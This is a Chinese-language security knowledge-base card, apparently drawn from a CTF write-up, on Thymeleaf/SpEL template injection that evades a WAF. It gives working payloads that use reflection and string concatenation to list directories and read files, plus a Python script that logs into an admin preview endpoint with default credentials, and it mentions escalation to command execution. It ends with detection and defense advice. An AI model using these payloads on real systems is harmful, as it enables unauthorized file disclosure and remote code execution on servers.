---
id: web-generic-ssti-thymeleaf-reflection-files-read-waf-bypass
title: Thymeleaf SSTI WAF 绕过：getClass().forName 反射 + 字符串拼接读取任意文件
type: scenario
domain: web
path: web/generic/ssti
technique: thymeleaf-ssti-reflection-files-read-waf-bypass
tags:
- web
- ssti
- thymeleaf
- spel
- waf-bypass
- reflection
- arbitrary-file-read
- java
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T17:13:38+08:00'
  notes: 已对照原文 EZ_JAVA 的 Files/Paths 反射 payload 与自动化脚本核对；未对真实目标执行 PoC。
url: /docs/web/generic/ssti/web-generic-ssti-thymeleaf-reflection-files-read-waf-bypass/
draft: false
kb_aliases:
- Thymeleaf 模板注入绕过
- SpEL getClass forName 绕过
- Thymeleaf 任意文件读取
- java.nio.file.Files.readAllLines SSTI
- 字符串拼接绕过 WAF
- Thymeleaf T() 黑名单绕过
---

## 一句话结论

Thymeleaf/SpEL 模板注入中，当 `${T(java.lang.Runtime).getRuntime().exec(...)}` 被 WAF 拦截时，可用 `''.getClass().forName('java.nio.file.Files')` 绕过 `T()` 与 `Runtime` 关键字取得任意类，再调用 `Files.readAllLines(Paths.get(path))` 读取任意文件；路径中的敏感字符串用 `'/'+'fla'+'g'` 拼接即可绕过子串过滤。

## 原理

- **Thymeleaf 表达式求值**：Thymeleaf 的 `${...}` 交给 SpringEL（SpEL）求值，表达式可访问对象、调用方法、加载类。经典的 RCE 链是 `T(java.lang.Runtime).getRuntime().exec('cmd')`，其中 `T()` 是 SpEL 的类型引用语法。
- **WAF 只盯 T()/Runtime**：很多规则只拦截 `T(`、`java.lang.Runtime`、`getRuntime`、`exec` 等关键字；SpEL 还允许通过实例反射拿到 `Class` 对象，再调用 `forName` 加载任意类，因此可以完全不用 `T()`。
- **getClass().forName 的作用**：`''.getClass()` 返回 `String` 的 `Class` 对象；`Class.forName('java.nio.file.Files')` 按名称加载目标类，随后可在表达式里调用其静态方法 `walk`/`readAllLines`。
- **文件读取替代命令执行**：`java.nio.file.Files.readAllLines(Paths.get('/flag'))` 返回文件所有行；`Files.walk(Paths.get('/'), 1).collect(Collectors.toList())` 可列目录。结果直接进入模板渲染，作为回显返回。
- **字符串拼接绕过路径关键字**：`'/'+'fla'+'g'+'_y0u_d0nt_kn0w'` 在运行时拼成完整路径，但 HTTP 请求中不出现连续的 `flag`，绕过只做子串匹配的 WAF。
- **为什么危害是文件读取而非仅报错**：`readAllLines` 的返回值是 `List<String>`，Thymeleaf 会把它渲染到页面（或包在异常信息里），无需命令执行即可拿到文件内容；若目标同时允许反射调用 `Runtime`/`ProcessBuilder`，同一套反射手法可升级为 RCE。

## 触发条件

- 应用使用 Thymeleaf（通常配合 Spring），且用户输入被当作模板表达式求值（如后台模板预览、邮件模板、动态页面片段）。
- WAF/黑名单拦截 `T(`、`Runtime`、`exec` 等常见 RCE 关键字，但未拦截 `getClass`、`forName`、`java.nio.file.Files`、`Paths`。
- 模板求值结果或异常信息会返回给攻击者（回显）。
- 进程对目标文件有读权限。

## 利用步骤

1. 确认模板注入：提交 `${7*7}`，观察返回是否为 49。
2. 测试常规 payload：`${T(java.lang.Runtime).getRuntime().exec('whoami')}`，确认是否被 WAF/解析拦截。
3. 改用反射类加载：`${''.getClass().forName('java.nio.file.Files')}`，确认可取得类。
4. 列目录：`${''.getClass().forName('java.nio.file.Files').walk(''.getClass().forName('java.nio.file.Paths').get('/'),1).collect(''.getClass().forName('java.util.stream.Collectors').toList())}`。
5. 读文件：`${''.getClass().forName('java.nio.file.Files').readAllLines(''.getClass().forName('java.nio.file.Paths').get('/'+'fla'+'g'+'_y0u_d0nt_kn0w'))}`。
6. 自动化：登录后台，向模板预览接口 POST `template=<payload>`，从响应中正则提取回显。

## PoC

```text
${''.getClass().forName('java.nio.file.Files').readAllLines(''.getClass().forName('java.nio.file.Paths').get('/'+'fla'+'g'+'_y0u_d0nt_kn0w'))}
```

```python
import re, requests

BASE = "http://TARGET"
s = requests.Session()
s.post(f"{BASE}/login", data={"username": "admin", "password": "admin123"}, timeout=10)

payload = ("${''.getClass().forName('java.nio.file.Files')"
           ".readAllLines(''.getClass().forName('java.nio.file.Paths')"
           ".get('/'+'fla'+'g'+'_y0u_d0nt_kn0w'))}")
r = s.post(f"{BASE}/admin/preview", data={"template": payload}, timeout=10)

m = re.search(r'<div class="notice">(.*?)</div>', r.text, re.DOTALL)
print(m.group(1) if m else r.text)
```

## 变体与关联

- 变体：用 `''.getClass().forName('java.lang.Runtime').getRuntime().exec('cmd')` 走反射版命令执行，绕过 `T()` 黑名单。
- 变体：用 `java.lang.ProcessBuilder`、`javax.script.ScriptEngineManager` 替代 Runtime。
- 变体：路径/类名用 `+` 拼接、`String.join`、`char` 数组或 Base64 解码进一步规避检测。
- 关联卡片：[[web-generic-ssti-waf-string-concat-eq-globals-bypass]]、[[web-generic-ssti-engine-identification-decision-tree-errors]]、[[web-generic-ssti-error-message-exfiltration]]、[[web-generic-ssti-freemarker-classpath-resource-read]]。

## 检测与防御

- 检测：请求体/模板参数中出现 `getClass`、`forName`、`java.nio.file.Files`、`readAllLines`、`Paths.get`、`Collectors.toList` 等反射/文件 API 组合。
- 检测：模板预览接口收到包含 `${...}`、`#{...}`、`*{...}` 的用户输入；短时间内出现大量路径拼接字符串。
- 防御：不要把用户输入作为模板表达式求值；使用固定模板 + 参数绑定。
- 防御：升级/配置 Thymeleaf 沙箱，限制 SpEL 的 `T()`、反射与类加载；WAF 增加反射链与文件 API 规则；以低权限运行应用。
